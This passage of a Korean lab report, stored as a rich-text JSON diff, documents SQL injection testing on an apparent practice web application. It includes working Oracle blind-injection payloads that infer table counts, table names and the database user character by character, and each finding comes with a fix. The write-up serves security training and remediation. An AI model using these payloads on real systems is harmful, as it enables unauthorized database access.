+            "text": "그림 2. Oracle 오류 메시지에 테이블 건수 111이 포함된 원본 화면."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "개선 방향: 입력값을 바인딩하고, DB 예외는 서버 로그에 기록한 뒤 사용자에게 일반 오류를 반환한다. 업무에 필요하지 않은 DB 객체 접근 권한을 제한한다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "향후 재검증 기준: 오류 유도 입력에서도 테이블명·열명·회원정보가 응답에 포함되지 않아야 하며, 정상 검색은 유지되어야 한다. 이 기준으로 수정 후 재검증한 기록은 아직 없다."
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "3. 불리언 기반 SQL 인젝션"
+          }
+        ]
+      },
+      {
+        "type": "table",
+        "content": [
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableHeader",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "항목"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableHeader",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "내용"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "원본"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "1일차 · 2026-11-02"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "확인 지점"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "http://shanky.co.kr:38080/lhs/join/checkPost2.jsp"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "입력값"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "동 이름 검색값 dong"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "요청 방식"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "POST"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "우편번호 조회 결과의 표시 여부를 참·거짓 판정 기준으로 사용하여 DB 메타데이터를 추론하였다. 실습 당시 조회 순서의 50번째 테이블명을 OGIS_GEOMETRY_COLUMNS로 확인하였다."
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "확인 과정"
+          }
+        ]
+      },
+      {
+        "type": "orderedList",
+        "content": [
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "동일한 검색 조건에서 참 조건을 넣으면 우편번호 행이 표시되고, 거짓 조건을 넣으면 결과 행이 표시되지 않는 것을 확인하였다."
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "테이블 수가 110보다 크다는 조건은 참, 111보다 크다는 조건은 거짓으로 관찰되어 접근 가능한 테이블 수를 111개로 판단하였다."
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "50번째로 선택된 테이블명의 길이를 비교하고, 길이 21이라는 동등 비교의 응답을 확인하였다."
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "SUBSTR와 ASCII를 이용하여 위치별 문자를 비교하였다. 전체 문자열 OGIS_GEOMETRY_COLUMNS와의 동등 비교에서도 결과 행이 표시되었다."
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "판정 기준은 검색 결과가 나타나는지였다. 먼저 동일한 정상 검색어에서 참 조건과 거짓 조건을 비교하고, 이 차이를 건수·길이·문자 추론에 사용했다. 아래 값은 원문의 URL 인코딩 표현을 풀어 읽기 쉽게 정리했다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "sql"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "영등포동' AND 1=1--\n영등포동' AND 1=2--\n영등포동' AND (SELECT COUNT(TABLE_NAME) FROM ALL_TABLES)>110--\n영등포동' AND (SELECT COUNT(TABLE_NAME) FROM ALL_TABLES)>111--\n\n영등포동' AND (SELECT LENGTH(TABLE_NAME) FROM (SELECT TABLE_NAME, ROWNUM AS RNUM FROM ALL_TABLES) WHERE RNUM=50)=21--\n영등포동' AND ASCII(SUBSTR((SELECT TABLE_NAME FROM (SELECT TABLE_NAME, ROWNUM AS RNUM FROM ALL_TABLES) WHERE RNUM=50),1,1))=79--\n영등포동' AND ASCII(SUBSTR((SELECT TABLE_NAME FROM (SELECT TABLE_NAME, ROWNUM AS RNUM FROM ALL_TABLES) WHERE RNUM=50),2,1))=71--\n영등포동' AND (SELECT TABLE_NAME FROM (SELECT TABLE_NAME, ROWNUM AS RNUM FROM ALL_TABLES) WHERE RNUM=50)='OGIS_GEOMETRY_COLUMNS'--"
+          }
+        ]
+      },
+      {
+        "type": "table",
+        "content": [
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableHeader",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "확인 항목"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableHeader",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "관찰"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableHeader",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "판정"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "테이블 건수"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": ">110 참, >111 거짓"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "111개"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "테이블명 길이"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": ">20 참, >21 거짓, =21 참"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "21자"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "문자 비교"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "O, G, I, S 순서로 확인"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "전체 후보를 조합"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "최종 확인"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "전체 문자열 비교가 참"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "OGIS_GEOMETRY_COLUMNS"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "원문의 두 번째 문자 설명은 SUBSTR의 위치가 1로 남아 있었지만, 캡처는 2를 사용했다. 여기서는 2로 바로잡았다. “50번째 테이블”은 실습 당시 조회 순서의 50번째라는 뜻이며, 고정된 객체 순번이 아니다. 같은 대상을 반복 검증하려면 명시적인 정렬이나 고유 키가 필요하다."
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "결과와 보완점"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "응답 본문에 테이블명을 직접 출력하지 않고도 참·거짓 응답의 차이로 21자 테이블명을 확인하였다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "직접적인 데이터 출력과 상세 오류를 숨기더라도, SQL 구문 삽입이 가능하면 응답 차이가 정보 추론 경로가 될 수 있다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "정렬 없는 ROWNUM의 “50번째”는 고정된 테이블을 의미하지 않는다. 동일한 테이블이 모든 실행에서 50번째라는 일반화는 하지 않는다."
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "src": "/assets/uploads/195deac9-942c-50cc-bb97-98c63f3af522/141d0ae2-70ce-5b8e-8961-76badb8af795.png",
+          "assetId": "141d0ae2-70ce-5b8e-8961-76badb8af795",
+          "alt": "OGIS_GEOMETRY_COLUMNS 전체 문자열 비교 후 검색 결과가 표시된 화면."
+        }
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "그림 3. OGIS_GEOMETRY_COLUMNS 전체 문자열 비교 후 검색 결과가 표시된 화면."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "개선 방향: 검색값을 SQL 구문과 분리해 바인딩한다. 입력값에 따른 DB 예외 처리를 일관되게 하고, DB 계정의 메타데이터·업무 테이블 접근 권한을 최소화한다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "향후 재검증 기준: SQL 조건을 추가한 값이 검색 문자열로 처리되는지 확인한다. 참·거짓 조건에 따라 내부 데이터가 추론되는 응답 차이가 없어야 한다. 이 기준으로 수정 후 재검증한 기록은 아직 없다."
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "4. 로그인 응답 기반 SQL 인젝션"
+          }
+        ]
+      },
+      {
+        "type": "table",
+        "content": [
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableHeader",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "항목"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableHeader",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "내용"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "원본"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "2일차 · 2026-11-03"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "확인 지점"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "http://shanky.co.kr:38080/lhs/login/login2.jsp"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "입력값"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "id, 비교 조건으로 유지한 passwd"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "요청 방식"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "POST 본문 확인"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "로그인 ID에 포함한 조건식에 따라 로그인 성공과 실패가 달라지는 현상을 이용하였다. 정상 비밀번호를 유지한 상태에서 Oracle USER 반환값을 INFOSEC으로 확인하였다."
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "확인 과정"
+          }
+        ]
+      },
+      {
+        "type": "orderedList",
+        "content": [
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "ID에 작은따옴표를 넣었을 때 SQL 오류 메시지가 나타났다. 비밀번호 필드에 같은 문자를 넣었을 때는 로그인 실패 메시지가 나타났다."
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "동일한 실습 계정과 비밀번호를 유지하면서 ID의 참·거짓 조건을 비교하였다. 참 조건은 로그인 성공, 거짓 조건은 로그인 실패로 구분되었다."
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "USER 반환값의 길이 7과 각 위치의 ASCII 값을 비교하였다. 문자 순서는 I, N, F, O, S, E, C이다."
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "USER 값과 INFOSEC의 전체 문자열 비교에서 성공 응답을 확인하였다. 이 값은 웹 서비스 회원 ID가 아니라 DB 세션 사용자명이다."
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "실습 계정의 정상 비밀번호를 유지하고 id에 조건을 붙였다. 비밀번호를 모르는 상태에서 로그인을 우회한 실험과 구분된다. 응답은 “로그인 성공”과 “ID 혹은 비밀번호가 틀렸습니다”로 갈렸다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "sql"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "-- id 입력값; passwd는 정상 실습 계정의 값으로 유지\n1' AND 1=1--\n1' AND 1=2--\n1' AND (SELECT LENGTH(USER) FROM DUAL)=7--\n1' AND ASCII(SUBSTR((SELECT USER FROM DUAL),1,1))=73--\n1' AND ASCII(SUBSTR((SELECT USER FROM DUAL),7,1))=67--\n1' AND (SELECT USER FROM DUAL)='INFOSEC'--"
+          }
+        ]
+      },
+      {
+        "type": "table",
+        "content": [
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableHeader",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "위치"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableHeader",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "1"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableHeader",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "2"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableHeader",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "3"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableHeader",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "4"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableHeader",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "5"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableHeader",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "6"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableHeader",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "7"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "ASCII"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "73"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "78"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "70"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "79"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "83"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "69"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "67"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "문자"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "I"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "N"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "F"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "O"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "S"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "E"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "C"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "DB USER는 웹 서비스 회원 ID와 다른 값이다. 길이 7과 문자별 비교 결과를 합친 뒤 INFOSEC 전체 비교로 확인했다. 원문에서 일곱 번째 문자를 설명할 때 남아 있던 SUBSTR 위치 2를 캡처와 일치하는 7로 고쳤다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "ID로 PW를 조회한 뒤 애플리케이션에서 비밀번호를 비교한다는 설명은 응답과 맞는 가설이다. 서버 코드를 확인한 사실은 아니다. 비밀번호에 작은따옴표를 넣어 오류가 달랐다는 이유만으로 해당 필드가 모든 SQLi에 안전하다고 결론 내리지 않는다."
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "결과와 보완점"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "로그인 응답 차이를 통해 DB 사용자명 INFOSEC을 확인하였다. 정상 비밀번호를 이용한 검증이므로 비밀번호 없는 인증 우회 성공으로 표현하지 않는다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "인증 기능이 DB 메타데이터 추론의 경로가 될 수 있다. ID 입력값을 SQL에 직접 결합하는 구현 여부를 우선 확인할 필요가 있다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "서버 SQL과 비밀번호 처리 방식은 응답에서 추정한 모델이다. 한 번의 비밀번호 입력 결과로 해당 필드가 안전하다고 확정하지 않는다. 실제 로그인 처리 URL은 원 요청 확인이 필요하다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "개선 방향: 로그인 조회를 매개변수화하고 비밀번호 검증을 안전한 해시 검증 함수로 처리한다. SQL 오류와 인증 실패 응답을 적절히 분리해 서버 로그로 관리한다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "향후 재검증 기준: 정상 로그인·잘못된 비밀번호·SQL 구문을 포함한 ID를 각각 확인하고, ID 조건으로 DB 정보를 추론할 수 없는지 점검한다. 이 기준으로 수정 후 재검증한 기록은 아직 없다."
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "5. 연봉 조회 조건 변경 SQL 인젝션"
+          }
+        ]
+      },
+      {
+        "type": "table",
+        "content": [
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableHeader",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "항목"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableHeader",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "내용"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "원본"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "2일차 · 2026-11-03"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "확인 지점"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "http://shanky.co.kr:38080/lhs/quiz/q1.jsp"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "입력값"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "연봉 하한과 상한 입력란"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "요청 방식"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "요청 방식 확인 필요"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "연봉 조회 기능에서 괄호 종료와 주석 구문을 포함한 입력을 사용하자 기존에 보이지 않던 ID가 출력되었다. 입력값이 조회 조건에 영향을 줄 수 있음을 확인하였다."
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "확인 과정"
+          }
+        ]
+      },
+      {
+        "type": "orderedList",
+        "content": [
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "숫자 구간 입력 화면과 비정상 입력에 대한 안내 메시지를 확인하였다. 화면의 입력 길이 제한만으로 서버 측 제한을 확정하지 않았다."
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "주석을 포함한 입력의 처리 결과를 비교하여 문자열 차단과 SQL 문법 오류의 가능성을 구분해 검토하였다."
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "BETWEEN 조건 및 괄호가 포함된 구조를 가정하고 입력별 결과를 비교하였다. 해당 SQL은 실제 소스가 아닌 응답 기반의 추정이다."
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
